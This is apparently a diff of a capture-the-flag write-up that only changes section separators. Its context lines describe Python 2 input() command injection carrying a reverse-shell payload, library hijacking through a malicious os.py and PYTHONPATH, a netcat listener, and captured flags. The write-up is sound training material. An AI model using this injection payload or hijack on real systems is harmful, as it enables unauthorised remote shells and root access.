@@ -20,7 +20,7 @@ Port 10000 (snet-sensor-mgmt): Open
 <br>
 *Figure 1: Evidence ID: 001 (Nmap Port Scanning Results).*
 
-...
+---
 
 2. Initial Access (User: king)
 The service on port 10000 runs a Python 2 script that uses the input() function. In Python 2, this function is vulnerable to Command Injection because it evaluates user input as live Python code.
@@ -35,7 +35,7 @@ __import__('os').system('python -c "import socket,os,pty;s=socket.socket(socket.
 <br>
 *Figure 2: Evidence ID: 002 (Successful Command Injection via Python 2 input).*
 
-...
+---
 
 Results:
 
@@ -47,7 +47,7 @@ User Flag: cf85ff769cfaa721758949bf870b019
 <br>
 *Figure 3: Evidence ID: 003 (User Flag Captured: cf85ff769cfaa721758949bf870b019).*
 
-...
+---
 
 3. Privilege Escalation (To Root)
 Enumeration revealed a root cronjob that runs a Python script located at /root/company/media/*.py. The system executes this script after performing a cd into the /home/king directory.
@@ -70,7 +70,7 @@ export PYTHONPATH=/home/king
 <br>
 *Figure 4: Evidence ID: 004 (Python Library Hijacking - Malicious os.py setup).*
 
-...
+---
 
 4. Capturing the Root Flag
 I set up a netcat listener on my local machine (Kali Linux) using the port defined in the malicious os.py script.
@@ -92,6 +92,8 @@ Root Flag: 9c37646777a53910a347f387dce025ec
 ![Root Shell](<./assets/Screenshot 5.png>)
 <br>
 *Figure 5: Evidence ID: 005 (Root Privilege Escalation and Final Flag).*
+
+---
 
 Final
 
